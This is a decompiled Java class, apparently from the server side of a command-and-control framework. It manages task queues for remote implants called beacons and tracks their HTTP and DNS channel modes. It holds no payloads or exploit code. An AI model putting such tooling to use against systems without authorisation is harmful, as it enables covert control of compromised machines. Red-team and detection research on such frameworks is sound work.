package beacon;

import common.CommonUtils;
import java.io.ByteArrayOutputStream;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class BeaconData {
   public static final int MODE_HTTP = 0;
   public static final int MODE_DNS = 1;
   public static final int MODE_DNS_TXT = 2;
   public static final int MODE_DNS6 = 3;
   protected Map queues = new HashMap();
   protected Map modes = new HashMap();
   protected Set tasked = new HashSet();
   protected boolean shouldPad = false;
   protected long when = 0L;

   protected List getQueue(String var1) {
      synchronized(this) {
         if (this.queues.containsKey(var1)) {
            return (List)this.queues.get(var1);
         } else {
            LinkedList var3 = new LinkedList();
            this.queues.put(var1, var3);
            return var3;
         }
      }
   }

   public boolean isNewSession(String var1) {
      synchronized(this) {
         return !this.tasked.contains(var1);
      }
   }

   public void virgin(String var1) {
      synchronized(this) {
         this.tasked.remove(var1);
      }
   }

   public void shouldPad(boolean var1) {
      this.shouldPad = var1;
      this.when = System.currentTimeMillis() + 1800000L;
   }

   public void task(String var1, byte[] var2) {
      synchronized(this) {
         List var4 = this.getQueue(var1);
         if (this.shouldPad && System.currentTimeMillis() > this.when) {
            CommandBuilder var5 = new CommandBuilder();
            var5.setCommand(3);
            var5.addString(var2);
            var4.add(var5.build());
         } else {
            var4.add(var2);
         }

         this.tasked.add(var1);
      }
   }

   public void seen(String var1) {
      synchronized(this) {
         this.tasked.add(var1);
      }
   }

   public void clear(String var1) {
      synchronized(this) {
         List var3 = this.getQueue(var1);
         var3.clear();
         this.tasked.add(var1);
      }
   }

   public int getMode(String var1) {
      synchronized(this) {
         String var3 = (String)this.modes.get(var1);
         if ("dns-txt".equals(var3)) {
            return 2;
         } else if ("dns6".equals(var3)) {
            return 3;
         } else {
            return "dns".equals(var3) ? 1 : 2;
         }
      }
   }

   public void mode(String var1, String var2) {
      synchronized(this) {
         this.modes.put(var1, var2);
      }
   }

   public boolean hasTask(String var1) {
      synchronized(this) {
         List var3 = this.getQueue(var1);
         return var3.size() > 0;
      }
   }

   public byte[] dump(String var1, int var2) {
      synchronized(this) {
         int var4 = 0;
         List var5 = this.getQueue(var1);
         if (var5.size() == 0) {
            return new byte[0];
         } else {
            ByteArrayOutputStream var6 = new ByteArrayOutputStream(8192);
            Iterator var7 = var5.iterator();

            while(var7.hasNext()) {
               byte[] var8 = (byte[])((byte[])var7.next());
               if (var4 + var8.length < var2) {
                  var6.write(var8, 0, var8.length);
                  var7.remove();
                  var4 += var8.length;
               } else {
                  if (var8.length < var2) {
                     CommonUtils.print_warn("Chunking tasks for " + var1 + "! " + var8.length + " + " + var4 + " past threshold. " + var5.size() + " task(s) on hold until next checkin.");
                     break;
                  }

                  CommonUtils.print_error("Woah! Task " + var8.length + " for " + var1 + " is beyond our limit. Dropping it");
                  var7.remove();
               }
            }

            return var6.toByteArray();
         }
      }
   }
}
